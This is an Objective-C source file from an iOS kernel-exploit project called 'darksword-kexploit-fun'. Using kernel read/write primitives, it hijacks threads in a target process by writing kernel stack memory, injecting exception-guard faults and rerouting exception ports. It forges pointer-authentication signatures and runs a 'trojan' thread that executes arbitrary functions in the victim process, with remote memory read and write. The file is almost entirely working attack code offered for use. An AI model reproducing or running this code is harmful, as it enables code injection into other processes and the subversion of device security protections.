//
//  remote_call.m
//  darksword-kexploit-fun
//
//  Created by seo on 3/29/26.
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <pthread.h>
#import <stdint.h>

#import "RemoteCall.h"
#import "VM.h"
#import "Exception.h"
#import "PAC.h"
#import "Thread.h"
#import "MigFilterBypassThread.h"
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/krw.h"
#import "../kexploit/offsets.h"
#import "../kexploit/kutils.h"
#import "../kexploit/xpaci.h"
#import "../utils/process.h"

extern bool gIsPACSupported;

// xnu-10002.81.5/osfmk/kern/exc_guard.h
#define EXC_GUARD_ENCODE_TYPE(code, type) \
    ((code) |= (((uint64_t)(type) & 0x7ull) << 61))
#define EXC_GUARD_ENCODE_FLAVOR(code, flavor) \
    ((code) |= (((uint64_t)(flavor) & 0x1fffffffull) << 32))
#define EXC_GUARD_ENCODE_TARGET(code, target) \
    ((code) |= (((uint64_t)(target) & 0xffffffffull)))


// xnu-10002.81.5/osfmk/mach/arm/_structs.h
#define __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK 0xff000000
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR 0x2
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC 0x4
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR 0x8

// from pe_main.js
#define SHMEM_CACHE_SIZE                100
#define FAKE_PC_TROJAN_CREATOR          0x101
#define FAKE_LR_TROJAN_CREATOR          0x201
#define FAKE_PC_TROJAN                  0x301
#define FAKE_LR_TROJAN                  0x401

// from https://github.com/nickingravallo/Machium/blob/main/Machium/Breakpoint.h
#define BREAKPOINT_ENABLE 481
#define BREAKPOINT_DISABLE 0

uint64_t g_RC_taskAddr;
bool g_RC_creatingExtraThread;
mach_port_t g_RC_firstExceptionPort;
mach_port_t g_RC_secondExceptionPort;
uint64_t g_RC_firstExceptionPortAddr;
uint64_t g_RC_secondExceptionPortAddr;
pthread_t g_RC_dummyThread;
mach_port_t g_RC_dummyThreadMach;
uint64_t g_RC_dummyThreadAddr;
uint64_t g_RC_dummyThreadTro;
uint64_t g_RC_selfThreadAddr;
uint32_t g_RC_selfThreadCtid;
arm_thread_state64_internal g_RC_originalState;
uint64_t g_RC_vmMap;
uint64_t g_RC_callThreadAddr;
uint64_t g_RC_trojanThreadAddr;
int g_RC_pid;
bool g_RC_success = true;
uint64_t g_RC_gadgetPacia = 0;

NSMutableArray<NSNumber *> *g_RC_threadList = nil;
uint64_t g_RC_trojanMem = 0;
struct VMShmem g_RC_shmemCache[SHMEM_CACHE_SIZE];

bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread, bool useMigFilterBypass) {
    bool success = false;
    
    void* thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
    void* pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
    
    pthread_t pthread = NULL;
    pthread_create_suspended_np(&pthread, NULL,
        (void *(*)(void *))thread_set_exception_ports_addr, NULL);
    
    mach_port_t machThread = pthread_mach_thread_np(pthread);
    uint64_t machThreadAddr = task_get_ipc_port_kobject(task_self(), machThread);

    if(useMigFilterBypass) {
        mig_bypass_monitor_threads(g_RC_selfThreadAddr, machThreadAddr);
    }

    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    thread_get_state(machThread, ARM_THREAD_STATE64, (thread_state_t)&state, &count);
    
    uint64_t diver = 0;
    diver = (uint64_t)state.__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
    
    arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
    arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);
    
    state.__x[0] = g_RC_dummyThreadMach;
    state.__x[1] = EXC_MASK_GUARD | EXC_MASK_BAD_ACCESS;
    state.__x[2] = exceptionPort;
    state.__x[3] = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
    state.__x[4] = ARM_THREAD_STATE64;
    
    if(useMigFilterBypass)
        usleep(100000);
    
    if (!thread_set_state_wrapper(machThread, machThreadAddr,
                                  (arm_thread_state64_internal *)&state))
        return false;
    
    if(useMigFilterBypass)
        usleep(100000);
    
    thread_set_mutex(g_RC_dummyThreadAddr, g_RC_selfThreadCtid);
    
    if (!thread_resume_wrapper(machThread))
        return false;
    
    for (int i = 0; i < 10; i++)
    {
        usleep(200000);

        uint64_t kstack = thread_get_kstackptr(machThreadAddr);
        if (!kstack) {
            printf("[%s:%d] Failed to get kstack. Retry...\n", __FUNCTION__, __LINE__);
            continue;
        }
        
        uint64_t kernelSP = kread64(kstack + off_arm_kernel_saved_state_sp);
        if (!kernelSP) {
            printf("[%s:%d] Failed to get SP. Retry...", __FUNCTION__, __LINE__);
            continue;
        }
        usleep(100);

        uint64_t pageBase = trunc_page(kernelSP) + 0x3000ULL;
        char dataBuff[0x1000];
        memset(dataBuff, 0, 0x1000);
        kreadbuf(pageBase, &dataBuff, 0x1000);

        uint64_t needleVal = g_RC_dummyThreadTro;
        void *match = memmem(dataBuff, 0x1000, &needleVal, sizeof(needleVal));
        if (!match) {
            printf("[%s:%d] Couldn't find g_RC_dummyThreadTro\n", __FUNCTION__, __LINE__);
            continue;
        }
        size_t foundOffset = (size_t)((uint8_t *)match - (uint8_t *)dataBuff);
        uint64_t found = (uint64_t)foundOffset + 0x3000;
        memset(dataBuff, 0, 0x1000);
        
        bool correctTro = false;
        uint64_t checkAddr = trunc_page(kernelSP) + found + 0x18ULL;
        uint64_t checkVal  = kread64(checkAddr);
        if (checkVal == 0x1002) {
            correctTro = true;
        } else {
            printf("[%s:%d] Wrong tro. Retry...\n", __FUNCTION__, __LINE__);
            continue;
        }
        
        if (found && correctTro) {
            if (thread_get_task(currThread) == g_RC_taskAddr) {
                uint64_t tro = thread_get_t_tro(currThread);
                kwrite64(trunc_page(kernelSP) + found, tro);
                success = true;
                break;
            } else {
                printf("[%s:%d] got empty tro, skip writing\n", __FUNCTION__, __LINE__);
            }
        } else {
            NSLog(@"[%s:%d] didnt find tro for 0x%llx", __FUNCTION__, __LINE__, (uint64_t)currThread);
        }
    }
    
    thread_set_mutex(g_RC_dummyThreadAddr, 0x40000000);
    
    thread_set_exception_ports(g_RC_dummyThreadMach, 0, exceptionPort, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
    
    if(useMigFilterBypass)
        usleep(100000);

    return success;
}

void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr)
{
    if(gIsPACSupported) {
        uint64_t diver = 0;
        diver = (uint64_t)state->__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
        uint64_t discPC = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("pc"));
        uint64_t discLR = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("lr"));
        
        if (pc) {
            uint32_t flags = state->__flags;
            flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
            state->__flags = flags;
            state->__pc = remote_pac(signingThread, pc, discPC);
        }
        if (lr) {
            uint32_t flags = state->__flags;
            flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
                       __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
            state->__flags = flags;
            state->__lr = remote_pac(signingThread, lr, discLR);
        }
        return;
    }
    
    if(!gIsPACSupported) {
        if (pc) state->__pc = pc;
        if (lr) state->__lr = lr;
    }
}

uint64_t do_remote_call_temp(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    int newTimeout = (10000 > timeout) ? 10000 : timeout;
    uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));

    ExceptionMessage exc;
    if (!wait_exception(g_RC_firstExceptionPort, &exc, newTimeout, false)) {
        printf("[%s:%d] Don't receive first exception on original thread\n", __FUNCTION__, __LINE__);
        return 0;
    }

    exc.threadState.__x[0] = x0;
    exc.threadState.__x[1] = x1;
    exc.threadState.__x[2] = x2;
    exc.threadState.__x[3] = x3;
    exc.threadState.__x[4] = x4;
    exc.threadState.__x[5] = x5;
    exc.threadState.__x[6] = x6;
    exc.threadState.__x[7] = x7;
    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN_CREATOR);
    reply_with_state(&exc, &exc.threadState);

    if (timeout < 0) {
        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
        return 0;
    }

    ExceptionMessage exc2;
    if (!wait_exception(g_RC_firstExceptionPort, &exc2, newTimeout, false)) {
        printf("[%s:%d] Don't receive second exception on original thread\n", __FUNCTION__, __LINE__);
        return 0;
    }
    uint64_t retValue = exc2.threadState.__x[0];
    reply_with_state(&exc2, &exc2.threadState);
    printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);
    if(strcmp(name, "getpid") == 0 && retValue == 0) {
        printf("[%s:%d] getpid failed\n", __FUNCTION__, __LINE__);
        printf("[%s:%d] spinning here...\n", __FUNCTION__, __LINE__);
        while(1) {};
    }
    return retValue;
}

uint64_t do_remote_call_stable(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    if (!g_RC_creatingExtraThread)
        return do_remote_call_temp(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);

    uint64_t pcAddr = (uint64_t)dlsym(RTLD_DEFAULT, name);
    if (!pcAddr) {
        printf("[%s:%d] Unable to find symbol: %s\n", __FUNCTION__, __LINE__, name);
        return 0;
    }
    int newTimeout = (10000 > timeout) ? 10000 : timeout;

    ExceptionMessage exc;
    if (!wait_exception(g_RC_secondExceptionPort, &exc, newTimeout, false)) {
        printf("[%s:%d] Don't receive first exception on new thread\n", __FUNCTION__, __LINE__);
        return 0;
    }

    exc.threadState.__x[0] = x0;
    exc.threadState.__x[1] = x1;
    exc.threadState.__x[2] = x2;
    exc.threadState.__x[3] = x3;
    exc.threadState.__x[4] = x4;
    exc.threadState.__x[5] = x5;
    exc.threadState.__x[6] = x6;
    exc.threadState.__x[7] = x7;
    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN);
    reply_with_state(&exc, &exc.threadState);

    if (timeout < 0) {
        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
        return 0;
    }

    ExceptionMessage exc2;
    if (!wait_exception(g_RC_secondExceptionPort, &exc2, newTimeout, false)) {
        printf("[%s:%d] Don't receive second exception on new thread\n", __FUNCTION__, __LINE__);
        return 0;
    }
    uint64_t retValue = exc2.threadState.__x[0];
    reply_with_state(&exc2, &exc2.threadState);
    printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);
    return retValue;
}

bool restore_trojan_thread(arm_thread_state64_internal *state)
{
    ExceptionMessage exc;
    if (!wait_exception(g_RC_firstExceptionPort, &exc, 20000, false)) {
        printf("[%s:%d] Failed to receive exception while restoring\n", __FUNCTION__, __LINE__);
        return false;
    }
    
    state->__flags = exc.threadState.__flags;
    sign_state(g_RC_trojanThreadAddr, state, state->__pc, state->__lr);
    reply_with_state(&exc, state);
    return true;
}

int destroy_remote_call(void) {
    if (g_RC_trojanMem) {
        do_remote_call_stable(100, "munmap", g_RC_trojanMem, PAGE_SIZE, 0, 0, 0, 0, 0, 0);
    }
    if (g_RC_creatingExtraThread) {
        do_remote_call_stable(-1, "pthread_exit", 0, 0, 0, 0, 0, 0, 0, 0);
    }
    else {
        restore_trojan_thread(&g_RC_originalState);
    }

    mach_port_destruct(mach_task_self_, g_RC_firstExceptionPort, 0, 0);
    mach_port_destruct(mach_task_self_, g_RC_secondExceptionPort, 0, 0);
    pthread_cancel(g_RC_dummyThread);
    
    g_RC_threadList = [NSMutableArray new];
    
    return 0;
}

struct VMShmem *get_shmem_from_cache(uint64_t pageAddr)
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (g_RC_shmemCache[i].used && g_RC_shmemCache[i].remoteAddress == pageAddr)
            return &g_RC_shmemCache[i];
    }
    return NULL;
}

struct VMShmem *put_shmem_in_cache(struct VMShmem *shmem)
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (!g_RC_shmemCache[i].used) {
            g_RC_shmemCache[i] = *shmem;
            g_RC_shmemCache[i].used = true;
            return &g_RC_shmemCache[i];
        }
    }
    printf("[%s:%d] g_RC_shmemCache full\n", __FUNCTION__, __LINE__);
    return NULL;
}

struct VMShmem *get_shmem_for_page(uint64_t pageAddr)
{
    struct VMShmem *cached = get_shmem_from_cache(pageAddr);
    if (cached) return cached;

    struct VMShmem newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
    if (!newShmem.localAddress)
            return NULL;
    return put_shmem_in_cache(&newShmem);
}

bool remote_read(uint64_t src, void *dst, uint64_t size)
{
    if (!src || !dst || !size) return false;
    uint64_t dstAddr = (uint64_t)(uintptr_t)dst;
    uint64_t until = src + size;

    while (src < until) {
        uint64_t remaining = until - src;
        uint64_t offs      = src & PAGE_MASK;
        uint64_t roundUp   = (src + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - src < remaining) ? (roundUp - src) : remaining;
        uint64_t pageAddr  = src & ~PAGE_MASK;

        struct VMShmem *page = get_shmem_for_page(pageAddr);
        if (!page) {
            printf("[%s:%d] remote_read failed: unable to find remote page\n", __FUNCTION__, __LINE__);
            return false;
        }
        memcpy((void *)(uintptr_t)dstAddr, (void *)(uintptr_t)(page->localAddress + offs), (size_t)copyCount);
        src     += copyCount;
        dstAddr += copyCount;
    }
    return true;
}

uint64_t remote_read64(uint64_t src)
{
    uint64_t val = 0;
    if (!remote_read(src, &val, sizeof(val))) return 0;
    return val;
}

void remote_hexdump(uint64_t remoteAddr, size_t size)
{
    uint8_t *buf = (uint8_t *)malloc(size);
    if (!buf) {
        return;
    }

    if (!remote_read(remoteAddr, buf, size)) {
        printf("[%s:%d] remote_read failed at 0x%llx\n", __FUNCTION__, __LINE__, (unsigned long long)remoteAddr);
        free(buf);
        return;
    }

    char ascii[17];
    ascii[16] = '\0';
    for (size_t i = 0; i < size; ++i) {
        if ((i % 16) == 0)
            printf("[0x%016llx+0x%03zx] ", (unsigned long long)remoteAddr, i);

        printf("%02X ", buf[i]);
        ascii[i % 16] = (buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) printf(" ");
                for (size_t j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");
                printf("|  %s \n", ascii);
            }
        }
    }

    free(buf);
}

bool remote_write(uint64_t dst, const void *src, uint64_t size)
{
    if (!src || !dst || !size) return false;
    
    uint64_t srcAddr = (uint64_t)(uintptr_t)src;
    uint64_t until   = dst + size;

    while (dst < until) {
        uint64_t remaining = until - dst;
        uint64_t offs      = dst & PAGE_MASK;
        uint64_t roundUp   = (dst + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - dst < remaining) ? (roundUp - dst) : remaining;
        uint64_t pageAddr  = dst & ~PAGE_MASK;

        struct VMShmem *page = get_shmem_for_page(pageAddr);
        if (!page) {
            printf("[%s:%d] remote_write failed: unable to find remote page\n", __FUNCTION__, __LINE__);
            return false;
        }

        memcpy((void *)(uintptr_t)(page->localAddress + offs), (const void *)(uintptr_t)srcAddr, (size_t)copyCount);
        dst     += copyCount;
        srcAddr += copyCount;
    }
    return true;
}

bool remote_write64(uint64_t dst, uint64_t val)
{
    return remote_write(dst, &val, sizeof(val));
}

bool remote_writeStr(uint64_t dst, const char *str)
{
    if (!str) return false;

    size_t len = strlen(str) + 1;
    return remote_write(dst, str, len);
}

uint64_t retry_first_thread(bool useMigFilterBypass) {
    if (useMigFilterBypass)
        mig_bypass_pause();
    
    sleep(1);
    
    if (useMigFilterBypass)
        mig_bypass_resume();
    
    return kread64(g_RC_taskAddr + off_task_threads_next);
}

// NOTE: Do not run this function while "attaching xcode" on iOS 18+, it will make device unstable.
int init_remote_call(const char* process, bool useMigFilterBypass) {
    
    uint64_t procAddr = proc_find_by_name(process);
    printf("[%s:%d] process: %s, pid: %u\n",  __FUNCTION__, __LINE__, process, kread32(procAddr + off_proc_p_pid));
    g_RC_taskAddr = proc_task(procAddr);
    
    mach_port_t firstExceptionPort = create_exception_port();
    mach_port_t secondExceptionPort = create_exception_port();
    
    printf("[%s:%d] firstExceptionPort: 0x%x, secondExceptionPort: 0x%x\n", __FUNCTION__, __LINE__, firstExceptionPort, secondExceptionPort);
    
    if (!firstExceptionPort || !secondExceptionPort)
    {
        printf("[%s:%d] Couldn't create exception ports\n", __FUNCTION__, __LINE__);
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    
    // Make sure the task won't crash after we handle an exception
    disable_excguard_kill(g_RC_taskAddr);
    
    mach_exception_code_t guardCode = 0;
    EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
    EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);  // ??? what is 0xf503 value meaning?
    
    uint64_t firstPortAddr = task_get_ipc_port_kobject(task_self(), firstExceptionPort);
    uint64_t secondPortAddr = task_get_ipc_port_kobject(task_self(), secondExceptionPort);
    
    pthread_t dummyThread = NULL;
    void *dummyFunc = dlsym(RTLD_DEFAULT, "getpid");
    pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
    mach_port_t dummyThreadMach = pthread_mach_thread_np(dummyThread);
    uint64_t dummyThreadAddr = task_get_ipc_port_kobject(task_self(), dummyThreadMach);
    uint64_t dummyThreadTro = kread64(dummyThreadAddr + off_thread_t_tro);
    mach_port_t threadSelf = mach_thread_self();
    uint64_t selfThreadAddr = task_get_ipc_port_kobject(task_self(), threadSelf);
    uint32_t selfThreadCtid = kread32(selfThreadAddr + off_thread_ctid);
    
    g_RC_creatingExtraThread = true;
    g_RC_firstExceptionPort = firstExceptionPort;
    g_RC_secondExceptionPort = secondExceptionPort;
    g_RC_firstExceptionPortAddr = firstPortAddr;
    g_RC_secondExceptionPortAddr = secondPortAddr;
    g_RC_dummyThread = dummyThread;
    g_RC_dummyThreadMach = dummyThreadMach;
    g_RC_dummyThreadAddr = dummyThreadAddr;
    g_RC_dummyThreadTro = dummyThreadTro;
    g_RC_selfThreadAddr = selfThreadAddr;
    g_RC_selfThreadCtid = selfThreadCtid;
    
    g_RC_threadList = [NSMutableArray new];
    
    int retryCount = 0;
    int validThreadCount = 0;
    int successThreadCount = 0;
    uint64_t firstThread = kread64(g_RC_taskAddr + off_task_threads_next);
    uint64_t currThread = firstThread;
    
    g_RC_trojanThreadAddr = firstThread;
    
    if (useMigFilterBypass)
        mig_bypass_resume();
    
    while (successThreadCount < 2 && validThreadCount < 5 && retryCount < 3) {
        uint64_t task = thread_get_task(currThread);
        if (!task) {
            if (!validThreadCount) {
                printf("[%s:%d] failed on getting first thread at all, resetting\n", __FUNCTION__, __LINE__);
                firstThread = retry_first_thread(useMigFilterBypass);
                currThread = firstThread;
                retryCount++;
                continue;
            } else {
                break;
            }
        }
        
        if (task == g_RC_taskAddr) {
            if (!set_exception_port_on_thread(g_RC_firstExceptionPort, currThread, useMigFilterBypass)) {
                printf("[%s:%d] Set exception port on thread:0x%llx failed\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                if (!validThreadCount) {
                    printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
                    firstThread = retry_first_thread(useMigFilterBypass);
                    currThread = firstThread;
                    retryCount++;
                    continue;
                }
            } else {
                // Inject a EXC_GUARD exception on this thread
                if (!inject_guard_exception(currThread, guardCode)) {
                    printf("[%s:%d] Inject EXC_GUARD on thread:0x%llx failed, not injecting\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                    if (!validThreadCount) {
                        printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
                        firstThread = retry_first_thread(useMigFilterBypass);
                        currThread = firstThread;
                        retryCount++;
                        continue;
                    }
                } else {
                    successThreadCount++;
                    [g_RC_threadList addObject:@(currThread)];
                    printf("[%s:%d] Inject EXC_GUARD on thread:0x%llx OK\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                }
            }
            validThreadCount++;
        } else if (task && !validThreadCount) {
            printf("[%s:%d] Got weird tro on first thread, resetting\n", __FUNCTION__, __LINE__);
            firstThread = retry_first_thread(useMigFilterBypass);
            currThread = firstThread;
            retryCount++;
            continue;
        }
        
        uint64_t next = kread64(currThread + off_thread_task_threads_next);
        if (!next) {
            if (!validThreadCount) {
                printf("[%s:%d] Got empty next thread. Retry\n", __FUNCTION__, __LINE__);
                firstThread = retry_first_thread(useMigFilterBypass);
                currThread = firstThread;
                retryCount++;
                continue;
            } else {
                printf("[%s:%d] Break because of empty next thread\n", __FUNCTION__, __LINE__);
                break;
            }
        }
        currThread = next;
    }
    
    if(useMigFilterBypass)
        mig_bypass_pause();
    
    printf("[%s:%d] Valid threads: %d\n", __FUNCTION__, __LINE__, validThreadCount);
    printf("[%s:%d] Injected threads: %d\n", __FUNCTION__, __LINE__, successThreadCount);
    
    if (g_RC_threadList.count == 0) {
        printf("[%s:%d] Exception injection failed. Aborting.\n", __FUNCTION__, __LINE__);
        destroy_remote_call();
        return -1;
    }
    
    ExceptionMessage exc;
    if(!wait_exception(firstExceptionPort, &exc, 120000, false)) {
        printf("[%s:%d] Failed to receive first exception\n", __FUNCTION__, __LINE__);
        destroy_remote_call();
        return -1;
    }
    
    memcpy(&g_RC_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));
    
    for (NSNumber *thread in g_RC_threadList) {
        clear_guard_exception(thread.unsignedLongLongValue);
    }
    printf("[%s:%d] Finish clearing EXC_GUARD from all other threads...\n", __FUNCTION__, __LINE__);
    
    ExceptionMessage exc2;
    int desiredTimeout = 1500;
    while (wait_exception(firstExceptionPort, &exc2, desiredTimeout, false)) {
        reply_with_state(&exc2, &exc2.threadState);
    }
    
    arm_thread_state64_internal newState = exc.threadState;
    sign_state(firstThread, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
    reply_with_state(&exc, &newState);
    
    uint64_t trojanMemTemp = ((uint64_t)exc.threadState.__sp & 0x7fffffffffULL) - 0x100ULL;
    printf("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__, trojanMemTemp);
    g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
    
    uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
    do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0); // for testing
    do_remote_call_temp(100, "pthread_create_suspended_np", trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);
    
    printf("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__, trojanMemTemp);
    uint64_t pthreadAddr    = remote_read64(trojanMemTemp);
    printf("[%s:%d] pthreadAddr: 0x%llx\n", __FUNCTION__, __LINE__, pthreadAddr);
    uint64_t callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
    printf("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__, callThreadPort);
    g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);
    
    if(useMigFilterBypass)
        mig_bypass_resume();
    
    if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
        printf("[%s:%d] Failed set exc port on new thread, retrying...\n", __FUNCTION__, __LINE__);
        pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
        g_RC_dummyThreadMach = pthread_mach_thread_np(dummyThread);
        g_RC_dummyThreadAddr = task_get_ipc_port_kobject(mach_task_self_, g_RC_dummyThreadMach);
        g_RC_dummyThreadTro  = kread64(g_RC_dummyThreadAddr + off_thread_t_tro);
        sleep(1);
        if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
            if(useMigFilterBypass)
                mig_bypass_pause();
            destroy_remote_call();
            return -1;
        }
    }
    
    if(useMigFilterBypass)
        mig_bypass_pause();
    
    printf("[%s:%d] All good! Resuming trojan thread...\n", __FUNCTION__, __LINE__);
    
    uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
    if (ret != 0) {
        printf("[%s:%d] Couldn't resume new thread, falling back to original\n", __FUNCTION__, __LINE__);
        g_RC_creatingExtraThread = false;
    }
    
    if (g_RC_creatingExtraThread) {
        printf("[%s:%d] New thread created, resuming original\n", __FUNCTION__, __LINE__);
        restore_trojan_thread(&g_RC_originalState);
    }
    printf("[%s:%d] Original thread restored\n", __FUNCTION__, __LINE__);
    
    g_RC_pid = (int)do_remote_call_stable(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
    printf("[%s:%d] Task pid: %d\n", __FUNCTION__, __LINE__, g_RC_pid);
    
    g_RC_trojanMem = do_remote_call_stable(1000, "mmap", 0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0, 0, 0);
    
    do_remote_call_stable(100, "memset", g_RC_trojanMem, 0, PAGE_SIZE, 0, 0, 0, 0, 0);
    
    g_RC_success = true;
    printf("[%s:%d] Finished successfully\n", __FUNCTION__, __LINE__);
    
    return 0;
}
